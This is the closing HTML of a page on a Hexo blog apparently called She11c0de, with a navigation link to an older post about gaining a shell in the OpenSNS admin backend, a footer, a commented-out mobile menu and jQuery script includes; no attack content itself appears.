    <a href="/2022/07/07/OpenSNS/OpenSNS%20%E5%90%8E%E5%8F%B0getshell/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title"></div>
    </a>
  
</nav>

  
</article>

</section>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2022 She11c0de<br>
      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <!--
      <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">首页</a>
  
    <a href="/categories/life" class="mobile-nav-link">生活</a>
  
    <a href="/archives" class="mobile-nav-link">归档</a>
  
</nav>
    -->
    

<!-- 百度分享 start -->

<!-- 百度分享 end -->

<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>




<script src="/js/jquery.scrollUp.min.js"></script>


<script src="/js/jquery.transform.js"></script>


<script src="/js/menu.js"></script>



<script src="/js/script.js"></script>


<script src="/js/scrollUp.js"></script>


  </div>
</body>
</html>